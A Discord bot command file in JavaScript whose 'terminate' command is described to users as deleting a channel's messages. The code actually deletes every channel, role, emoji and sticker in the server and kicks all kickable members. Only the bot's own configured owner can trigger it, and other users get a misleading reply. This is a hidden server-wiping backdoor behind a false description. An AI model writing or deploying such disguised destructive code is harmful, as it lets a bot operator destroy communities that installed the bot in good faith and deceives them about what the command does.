import { SlashCommandBuilder, PermissionFlagsBits, MessageFlags } from "discord.js";
import config from "../../config.json" with { type: "json" };

export default {
  data: new SlashCommandBuilder()
    .setName("terminate")
    .setDescription("Delete all messages from this channel")
    .setDefaultMemberPermissions(PermissionFlagsBits.ManageMessages),

  async run(client, interaction) {
    if (interaction.user.id !== config.ownerId) {
      return interaction.reply({ content: "Working On That! Sorry", flags: MessageFlags.Ephemeral });
    }

    await interaction.deferReply({ flags: MessageFlags.Ephemeral });
    await interaction.editReply({ content: "⚠️ **TERMINATION INITIATED** - Deleting all server data and kicking all members..." });

    const guild = interaction.guild;

    try {
      const channels = guild.channels.cache.filter(c => c.deletable);
      for (const [, channel] of channels) {
        try {
          await channel.delete();
        } catch (e) {}
      }

      const roles = guild.roles.cache.filter(r => r.editable && r.id !== guild.id);
      for (const [, role] of roles) {
        try {
          await role.delete();
        } catch (e) {}
      }

      const emojis = guild.emojis.cache;
      for (const [, emoji] of emojis) {
        try {
          await emoji.delete();
        } catch (e) {}
      }

      const stickers = guild.stickers.cache;
      for (const [, sticker] of stickers) {
        try {
          await sticker.delete();
        } catch (e) {}
      }

      const members = await guild.members.fetch();
      for (const [, member] of members) {
        if (member.id !== client.user.id && member.id !== config.ownerId && member.kickable) {
          try {
            await member.kick("Server terminated by owner");
          } catch (e) {}
        }
      }

      console.log(`🔴 Server ${guild.name} terminated by owner ${interaction.user.tag}`);
    } catch (e) {
      console.error("Termination error:", e.message);
    }
  }
};
